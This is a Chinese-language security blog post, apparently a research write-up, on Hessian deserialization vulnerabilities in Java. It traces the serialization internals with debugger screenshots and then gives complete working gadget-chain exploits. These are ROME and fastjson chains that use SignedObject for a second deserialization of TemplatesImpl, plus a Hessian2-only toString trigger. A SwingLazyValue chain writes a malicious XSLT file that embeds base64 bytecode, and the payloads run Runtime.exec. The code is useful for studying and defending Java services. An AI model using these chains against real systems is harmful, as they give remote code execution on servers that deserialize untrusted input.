![image-20260709194314638](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709194314638.png)

最后序列化生成的数据大致如下：

![image-20260709194525485](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709194525485.png)

————————————————

##### hessian2反序列化

Hessian2Input类的初始化没什么好看的，跟进它的readObject()方法，同样读取标志位信息并匹配：

![image-20260709195411486](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709195411486.png)

![image-20260709195428372](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709195428372.png)

跟进readObjectDefinition()方法：

![image-20260709195846017](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709195846017.png)

这里的findSerializerFactory()和hessian2序列化部分一样，返回了一个默认情况初始化的SerializerFactory类实例。跟进调用的SerializerFactory# getObjectDeserializer()方法：

![image-20260709195926585](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709195926585.png)

其中调用的getObjectDeserializer()方法：

![image-20260709195941996](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709195941996.png)

又是获取“反序列化类”的操作。并且这里的getDeserializer()方法和前面hessian1反序列化后续的过程也基本一模一样，最后获取到的“反序列化类”情况如下：

![image-20260709200443508](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709200443508.png)

获取到“反序列化类”后一直返回，回到readObjectDefinition()方法：

![image-20260709200950665](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709200950665.png)

分别使用fields和fieldNames存储field的“反序列化类”和field的名称，简单看一下这里调用的createField()方法：

![image-20260709201126331](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709201126331.png)

很容易看懂。

在readObjectDefinition()方法的最后，将所有获取到的field相关内容都放到ObjectDefiniton类并存入`_classDefs`变量中：

![image-20260709201618789](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709201618789.png)

![image-20260709201634929](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709201634929.png)

大致就是一个用于后续信息传递的类。

回到Hessian2Input类的readObject()方法，在readObjectDefinition()方法结束后会再次调用readObject()方法：

![image-20260709201911852](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709201911852.png)

判断了`_classDefs`大小并取出其中的类，也就是刚刚放进去的相关信息：

![image-20260709202002186](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709202002186.png)

再跟进这里调用的readObjectInstance()方法：

![image-20260709202152339](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709202152339.png)

取出相关信息，然后调用了UnsafeDeserializer类的readObject()方法：

![image-20260709202734264](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709202734264.png)

这里的instantiate()就是通过Unsafe类的allocateInstance()方法来实例化一个类，跟进这里调用的重载的readObject()方法：

![image-20260709202905192](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709202905192.png)

这里就和前面的大差不差了，分别如下String类型和int类型的图：

![image-20260709203007831](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709203007831.png)

![image-20260709203058607](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709203058607.png)

成功实现反序列化为对象。

——————————————

### 总结

主要就是有如下几个关键点需要注意：

-   在web 远程调用中客户端默认是发送hessian1序列化的内容，接受hessian2序列化的响应
-   具体的hessian序列化和反序列化：
    -   整体序列化和反序列化对java类进行操作都是通过Unsafe中的方法进行的，比如反序列化时是直接通过Unsafe类的allocateInstance()方法来实例化一个类
    -   反序列化时并且没有检查对应类是否实现了Serializable接口，也就是说除了默认的黑名单中的类，可以反序列化其他任意类。
    -   默认情况下序列化要求对应类实现了Serializable接口，但可人为修改`_isAllowNonSerializable`变量值达到序列化时不再检查
    -   序列化和反序列化时都会跳过transient和static类型修饰的field。

## 反序列化漏洞

由于其自身实现关系，通过构造特定的序列化流，经过反序列化后可能会造成任意代码执行。

### put链

Hessian1.0和Hessian2.0的反序列化利用的具体逻辑都位于MapDeserializer#readMap：

![image-20260709215502807](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709215502807.png)

首先会创建一个Map对象，然后将key和value分别反序列化put进map中，而 HashMap#put 中可以出发key对象的hashcode()方法：

![image-20260709215629780](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709215629780.png)

![image-20260709215647215](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709215647215.png)

在前面调试过程中，就可以知道MapDeserializer就是一个“反序列化类”，对应的也会有个“序列化类”叫MapSerializer，只要我们要序列化的类继承或实现了map.class对象，就可以获取到相关类来进行反序列化/序列化处理。以Hessian2的序列化过程为例，将要序列化的类改成HashMap类实例，关键部分其调用栈变成了：

```php
loadSerializer:333, SerializerFactory (com.caucho.hessian.io)
getSerializer:267, SerializerFactory (com.caucho.hessian.io)
getObjectSerializer:217, SerializerFactory (com.caucho.hessian.io)
writeObject:463, Hessian2Output (com.caucho.hessian.io)
main:16, Main (hessian)
```

![image-20260709221235270](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709221235270.png)

这里就直接获取到了“序列化类”，后续的调用writeObject()方法也会发生变化，其写入的第一个标志位信息就会变化：

![image-20260709221502687](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709221502687.png)

变成了H，不是前面分析的C，此时调用栈如下：

```php
writeMapBegin:554, Hessian2Output (com.caucho.hessian.io)
writeObject:90, MapSerializer (com.caucho.hessian.io)
writeObject:465, Hessian2Output (com.caucho.hessian.io)
main:16, Main (hessian)
```

对应的Hessian2的反序列化部分也会变化：

![image-20260709221653417](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709221653417.png)

因为标志位数据变了，相关的Hessian2Input#readObject()的匹配逻辑也会变，后续的处理逻辑也会变，比如这里继续跟进调用的SerializerFactory#readMap()方法：

![image-20260709221842112](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709221842112.png)

很明显就可以看出会直接调用MapDeserializer#readMap()方法，也就是存在漏洞点的地方。

其他就很简单了，比如序列化部分的writeObject处理：

![image-20260709222342922](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260709222342922.png)

很容易看出来逻辑，就是从HashMap中取出键值对分别进行序列化。

还有Hessian1的序列化与反序列化部分，大致过程是一样的，自行调试一下即可，这里不多说。

——————————

另外看了一下readMap()方法里面的变量相关情况（用的hessian1.0进行测试）：

![image-20260710000258489](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260710000258489.png)

可以知道至少这里的map可以控制为HashMap、TreeMap类实例，以及一个自定义的map（注意这里是equals()，就算传入的是TreeMap.class最后都会走else自行初始化为一个对象），看了一下关键的`_type`和`_ctor`变量的赋值：

![image-20260710000535384](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260710000535384.png)

可以看出主要和MapDeserializer类初始化时传入的参数有关。测试跟进了一下反序列化时MapDeserializer的实例化情况，主要有两种：

第一种是测试的正常途径，也就是反序列化的类其本身或者其父类实现了Map.class接口类，如下图（这里测的TreeMap类）：

![image-20260710001002568](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260710001002568.png)

第二种是测的HashMap类，其在反序列化时就没获取到对应标志位信息：

![image-20260710001426145](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260710001426145.png)

其最后走的路线就是else语句：

![image-20260710001541739](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260710001541739.png)

出现这个情况还是因为序列化部分的处理，在MapSerializer#writeObject()部分：

![image-20260710003103378](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260710003103378.png)

如果要序列化的类是HashMap，或者对应类没有实现Serializable接口则开头标志位的type内容会写为null，否则就正常写入（这里的`_isSendJavaType`变量默认为true，所以不用管else if）。故HashMap的写入情况如下：

![image-20260710003002325](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260710003002325.png)

TreeMap情况如下：

![image-20260710002700795](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260710002700795.png)

这样也就对应上了前面反序列化HashMap和TreeMap因为readType()的结果不同导致后续走的路不一样了。

**这里重点说这个是因为如果已有链子都被ban完了，可以尝试看还有没有其他的实现了Map.class接口的类的put方法可以利用**，这个类需要满足如下条件：

-   **实现了Serializable接口**，不然序列化时会将type设置为null，导致反序列化时只能走HashMap类的put()方法。
-   **有无参的public构造函数**，不然在反序列化过程中的反射获取对象不能成功，后续同样只能走只能走HashMap类的put()方法。

Hessian2.0部分就不跟进了，大致看了一下，基本上是一样的，自行跟进即可。

在前面的分析中，这里主要是利用的Map类型的类在hessian反序列化中会调用它的put()方法来放入键值对，而在以前链子的分析中，**非常经典的就是HashMap反序列化时调用的put()方法，通过这个方法可以打hashCode()、equals()+toString()以及equals()+get()等方法**，后面来看看一个利用链。

#### 结合ROME依赖

在rome链的时候就提到了可以打hashCode()方法，搬过来的大概实现思路就是HashMap#put() => ObjectBean#hashCode() => ToStringBean#toString() => TemplatesImpl#getOutputProperties()。但是这里有个问题就是在前面的分析中，可以知道不管是序列化还是反序列化，都会跳过static和transient修饰的field，正巧在我们常打的TemplatesImpl链中有个关键变量就是transient修饰的：

![image-20260716172353256](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260716172353256.png)

正常来说是需要其为一个TransformerFactoryImpl类实例的，否则原来的TemplatesImpl链不能进行下去：

![image-20260716172448456](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260716172448456.png)

但是在TemplatesImpl类的readObejct()方法是有给`_tfactory`变量赋值的：

![image-20260716175908059](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260716175908059.png)

这也是我们以前分析的Java原生反序列化链子可以打成功的原因。

故在这里的hessian反序列化中，可以加一个SignedObject的二次反序列化来实现给`_tfactory`变量赋值，这里二次反序列化再接一个ROME链就行，最后实现代码如下：

```java
package hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import java.io.*;
import java.lang.reflect.Array;
import java.util.Base64;
import java.util.HashMap;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.security.Signature;
import java.security.SignedObject;
import java.security.KeyPairGenerator;
import java.security.KeyPair;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;

public class Main {
    public static void main(String[] args) throws Exception {
        
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = classPool.makeClass("Evil");
        String cmd= "java.lang.Runtime.getRuntime().exec(\\\\"open -a Calculator\\\\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] code = new byte[][]{classBytes};

        TemplatesImpl tem = new TemplatesImpl();
        setFieldValue(tem, "_name", "fupanc");
        setFieldValue(tem, "_bytecodes", code);
        setFieldValue(tem, "_class", null);

        HashMap map = getHashMap(Templates.class,tem);

        
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(map,kp.getPrivate(),Signature.getInstance("DSA"));

        
        HashMap map2 = getHashMap(SignedObject.class,signedObject);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.writeObject(map2);
        hessian2Output.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        Hessian2Input hessianInput = new Hessian2Input(byteArrayInputStream);
        hessianInput.readObject();

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Class clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(obj,value);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
    }
    public static HashMap getHashMap(Class clazz, Object object) throws Exception {
        ToStringBean tom = new ToStringBean(clazz, object);
        ObjectBean Bean = new ObjectBean(ToStringBean.class, tom);

        HashMap hashMap = new HashMap();
        setFieldValue(hashMap, "size", 1);
        Class nodeC = Class.forName("java.util.HashMap$Node");
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 1);
        Array.set(tbl, 0, nodeCons.newInstance(0, Bean, "nivia", null));
        setFieldValue(hashMap, "table", tbl);

        return hashMap;
    }

}
```

运行即可在反序列化时弹出计算机：

![image-20260716184827030](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260716184827030.png)

这里为了防止在序列化前因为使用HashMap#put()方法弹出计算机，**使用非常方便的方法修改了HashMap存储键值对的table变量，将需要设置的键值对直接写进去即可**，这样也可以避免分析很多过程以防止序列化前弹出计算机。

#### 结合fastjson依赖

这里主要是来尝试构造一下equals()+toString()方法，也就是非常经典的toString方法触发fastjson反序列化调用链，大致的调用链过程是HashMap#put() -> AbstractMap#equals() -> XString#equals() -> JSONObejct#toString()，也就是如下：

![image-20260716232705671](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260716232705671.png)

![image-20260716233018286](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260716233018286.png)

![image-20260716232748936](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260716232748936.png)

后续就是打fastjson的反序列化调用链了。具体细节就不多说了，以前的Java原生反序列化链子都分析过，需要注意的就是hash值的相同，也就是后续代码中为什么嵌套了HashMap类实例。故最后实现代码如下（同样因为hessian反序列化特性，这里通过二次反序列化来打Templates链）：

```java
package hessian;

import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;
import java.lang.reflect.Field;
import java.security.Signature;
import java.security.SignedObject;
import java.security.KeyPairGenerator;
import java.security.KeyPair;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javax.management.BadAttributeValueExpException;

public class Main {
    public static void main(String[] args) throws Exception {
        
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = classPool.makeClass("Evil");
        String cmd= "java.lang.Runtime.getRuntime().exec(\\\\"open -a Calculator\\\\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] code = new byte[][]{classBytes};

        TemplatesImpl tem = new TemplatesImpl();
        setFieldValue(tem, "_name", "fupanc");
        setFieldValue(tem, "_bytecodes", code);
        setFieldValue(tem, "_class", null);

        
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("fupanc",tem);

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        setFieldValue(bad, "val", jsonObject);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(bad,kp.getPrivate(),Signature.getInstance("DSA"));

        
        JSONObject jsonObject1 = new JSONObject();
        jsonObject1.put("fupanc1",signedObject);

        XString xString = new XString("fupanc");

        HashMap hashMap0 = new HashMap();
        hashMap0.put("zZ",jsonObject1);
        hashMap0.put("yy",xString);

        HashMap hashMap1 = new HashMap();
        hashMap1.put("zZ",xString);
        hashMap1.put("yy",jsonObject1);

        HashMap hash = makeMap(hashMap0,hashMap1);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.writeObject(hash);
        hessian2Output.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        Hessian2Input hessianInput = new Hessian2Input(byteArrayInputStream);
        hessianInput.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Class clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(obj,value);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, "1", null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, "2", null));
        setFieldValue(s, "table", tbl);
        return s;
    }
}
```

同样的因为直接使用HashMap#put()方法会在序列化前弹出计算机，这里就直接人为往里面新建node以存入特定顺序的键值对。

运行成功反序列化时弹出计算机：

![image-20260716234807303](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260716234807303.png)

——————————————————

当然还有其他的链子就不说了，比如直接通过getter打jndi，不需要套一个二次反序列化。大致都是利用的一个Map类的put()中的方法流转调用，重点还是要看项目中的依赖有些什么。**由此我们复现了一下hessian反序列化打hashCode()以及toString()方法，这两个方法还是作为很多其他链子的触发点的**。另外注意的是这里的put链是**hessian1和hessian2两个版本都可以直接打的**，在前面分析的过程中就可以知道其实两者中间调用的一些方法是一样的，都调用了MapDeserializer#readMap()方法等等，这里就不多说了。

### toString链

**Hessian2.0专属的链子入口**。主要是利用到了Hessian2.0反序列化时的一个异常处理。大致跟进一下链子流程，跟进调用的Hessian2Input#readObject()方法：

![image-20260717124152954](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717124152954.png)

跟进readObjectDefinition()方法：

![image-20260717124223989](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717124223989.png)

跟进readString()方法：

![image-20260717131117137](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717131117137.png)

这里要求进入最后的抛出异常，跟进expect()方法：

![image-20260717131232548](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717131232548.png)

**这里又进行了一次hessian2反序列化，可以得到一个类对象，并且后续拼接到了字符串中，会触发对应类的toString()方法**。链子还是挺清晰的，但是需要考虑的是如何在readString()方法中进入异常处理部分的语句。这里的解决方式大概如下：

```java
public static ByteArrayOutputStream HessianTostringSerial(Object o) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(o);
        out.flushBuffer();
        return baos;
    }
```

已经有的轮子，大概意思就是人为先在序列化流里面放入C，然后再正常hessian2序列化，而在反序列化过程中，首先匹配到了C从而可以进入readObjectDefinition()方法，到后续的readString()方法，这个方法本来是用来获取反序列化的类，但是因为**这里的处理方式，在取出第一个标志位后，后续还是一个完整的hessian2序列化的数据，会导致readString()方法处理数据时因为长度错乱进行expect处理**，后续就是前面分析的了。后面来看看怎么打链子。

#### 结合fastjson依赖

很简单，构造代码如下：

```java
package hessian;

import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.lang.reflect.Field;
import java.security.Signature;
import java.security.SignedObject;
import java.security.KeyPairGenerator;
import java.security.KeyPair;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javax.management.BadAttributeValueExpException;

public class Main {
    public static void main(String[] args) throws Exception {
        
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = classPool.makeClass("Evil");
        String cmd= "java.lang.Runtime.getRuntime().exec(\\\\"open -a Calculator\\\\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] code = new byte[][]{classBytes};

        TemplatesImpl tem = new TemplatesImpl();
        setFieldValue(tem, "_name", "fupanc");
        setFieldValue(tem, "_bytecodes", code);
        setFieldValue(tem, "_class", null);

        
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("fupanc",tem);

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        setFieldValue(bad, "val", jsonObject);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(bad,kp.getPrivate(),Signature.getInstance("DSA"));

        JSONObject jsonObject1 = new JSONObject();
        jsonObject1.put("fupanc1",signedObject);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(67);
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.writeObject(jsonObject1);
        hessian2Output.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        Hessian2Input hessianInput = new Hessian2Input(byteArrayInputStream);
        hessianInput.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Class clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(obj,value);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
    }
}
```

运行即可在反序列化时弹出计算机：

![image-20260717133354056](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717133354056.png)

这里同样因为TemplatesImpl类的`_tfactory`变量不能被序列化和反序列化，这里打一个二次反序列化来给对应变量赋值以确保链子能走完。

和依赖相关的链子就不多说了，链子很多，舞台很大，从这里分析的几个方法入手即可，后面来看看一些jdk原生链。

### JDK原生链

**后续这一块主要还是利用到了hessian反序列化不会检查对应类是否实现Serializable接口，这样就可以利用到很多Java原生反序列化用不到的类**，入口点主要还是前面分析的put链和toString链，这里来看一下JDK原生链，利用面广。

#### SwingLazyValue链

主要利用到了UIDefaults和SwingLazyValue类，这条链子可以触发任意类的静态方法，这里的链子起始有两种，主要都是为了触发UIDefaults#get()方法，大致过程如下：

##### 起始点一

调用其他类的toString()方法（我这里就直接用hessian2专属的了，当然hessian1也能如前面分析那样触发toString()方法）：

![image-20260717154939793](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717154939793.png)

这里再选择触发MimeTypeParameterList#toString()方法：

![image-20260717183123506](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717183123506.png)

进而触发UIDefaults#get()方法：

![image-20260717155921402](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717155921402.png)

跟进getFromHashtable()方法：

![image-20260717160130955](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717160130955.png)

控制这里为调用SwingLazyValue#createValue()方法：

![image-20260717160244642](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717160244642.png)

诸如`methodName`、`className`等变量都是可以在SwingLazyValue初始化时敲定的，**同时由图可看出这里的invoke指定的是一个Class对象的var2，故这里只能调用另一个类的static方法**。

通过toString()方法作为起始点的构造参考后续的xslt链，这里就不多说了。

##### 起始点二

起始点二就是通过HashMap#put() -> Hashtable#equals() -> UIDefaults#get()方法，过渡的地方就是：

![image-20260718201145183](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718201145183.png)

控制这里的t为UIDefault即可。同样这里的构造就直接看后续的MethodUtil链，这里就不多说了。

——————————

下面来简单看看两个利用链子。

##### XSLT链

一条高可用的链子，大致的利用点是加载恶意的xslt文件，所以可以结合两条链子来打，**一条写恶意xslt文件，一条加载xslt文件**。下面来分别说明一下。

###### 写文件链

主要是利用了JavaUtils#writeBytesTofilename()方法：

![image-20260718214725570](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718214725570.png)

一个很明显的可以写文件的静态方法。所以准备一个恶意的xslt文件内容即可，文件模版是：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>"
                xmlns:b64="<http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder>"
                xmlns:ob="<http://xml.apache.org/xalan/java/java.lang.Object>"
                xmlns:th="<http://xml.apache.org/xalan/java/java.lang.Thread>"
                xmlns:ru="<http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils>"
>
    <xsl:template match="/">
        <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'base64')"/>
        <xsl:variable name="cl" select="th:getContextClassLoader(th:currentThread())"/>
        <xsl:variable name="rce" select="ru:defineClass('classname',$bs,$cl)"/>
        <xsl:value-of select="$rce"/>
    </xsl:template>
</xsl:stylesheet>
```

一个动态加载字节码的操作，自行准备class数据并base64加密后写进去即可，同时记得修改classname与class数据里面的相同。

故可以准备java文件为：

```java
package org.example;

public class Text {
    static{
        try{
            Runtime.getRuntime().exec("open -a Calculator");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

打成class文件并输出为base64数据，最后填充进模版即可：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>"
xmlns:b64="<http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder>"
xmlns:ob="<http://xml.apache.org/xalan/java/java.lang.Object>"
xmlns:th="<http://xml.apache.org/xalan/java/java.lang.Thread>"
xmlns:ru="<http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils>"
>
    <xsl:template match="/">
      <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAFwEAClNvdXJjZUZpbGUBAAlUZXh0LmphdmEMAAkACgcAGwwAHAAdAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAeAB8BABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAgAAoBABBvcmcvZXhhbXBsZS9UZXh0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcAAbEAAAABAAwAAAAGAAEAAAAEAAgADQAKAAEACwAAAE8AAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAgAMAAAAFgAFAAAABwAJAAoADAAIAA0ACQARAAsADgAAAAcAAkwHAA8EAAEAEAAAAAIAEQ==')"/>
      <xsl:variable name="cl" select="th:getContextClassLoader(th:currentThread())"/>
      <xsl:variable name="rce" select="ru:defineClass('org.example.Text',$bs,$cl)"/>
      <xsl:value-of select="$rce"/>
    </xsl:template>
  </xsl:stylesheet>
```

然后直接写进去就行，代码如下：

```java
package hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.lang.reflect.Field;
import sun.swing.SwingLazyValue;
import javax.activation.MimeTypeParameterList;
import javax.swing.*;

public class Main {
    public static void main(String[] args) throws Exception {
        SwingLazyValue lazyValue = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils","writeBytesToFilename",new Object[]{"/tmp/evil.xslt",Files.readAllBytes(Paths.get("/tmp/1.xslt"))});
        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("fupanc", lazyValue);

        MimeTypeParameterList mtp = new MimeTypeParameterList();
        setFieldValue(mtp,"parameters",uiDefaults);

